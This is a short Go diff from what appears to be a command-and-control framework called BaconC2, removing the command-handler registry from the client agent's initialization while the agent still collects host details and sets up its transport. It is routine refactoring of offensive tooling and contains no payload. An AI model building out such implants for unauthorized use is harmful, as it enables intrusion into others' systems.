@@ -5,7 +5,6 @@ import (
 
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
-	command_handler "github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers/system"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
@@ -37,15 +36,12 @@ func (c *AgentClient) Initialize() error {
 		log.Printf("Failed to gather minimal system info: %v", err)
 	}
 
-	commandRegistry := command_handler.GetGlobalCommandRegistry()
-
 	c.agent = models.Agent{
 		ID:       c.config.AgentID,
 		Hostname: sysInfo.Hostname,
 		IP:       sysInfo.IP,
 		OS:       sysInfo.OS,
 		Protocol: sysInfo.Protocol,
-		Handlers: commandRegistry.GetAllRegisteredHandlers(),
 	}
 
 	if err := c.transport.Initialize(c.agent); err != nil {
